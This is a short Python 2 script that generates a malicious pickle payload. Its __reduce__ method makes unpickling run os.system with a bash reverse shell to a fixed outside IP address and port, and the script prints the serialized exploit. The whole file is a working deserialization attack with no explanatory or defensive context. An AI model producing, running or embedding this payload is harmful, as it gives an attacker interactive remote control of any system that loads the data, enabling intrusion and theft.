import cPickle
import os

class Blah(object):
  def __reduce__(self):
    return (os.system,("bash -i >& /dev/tcp/178.128.255.102/1234 0>&1",))

h = Blah()
print cPickle.dumps(h)
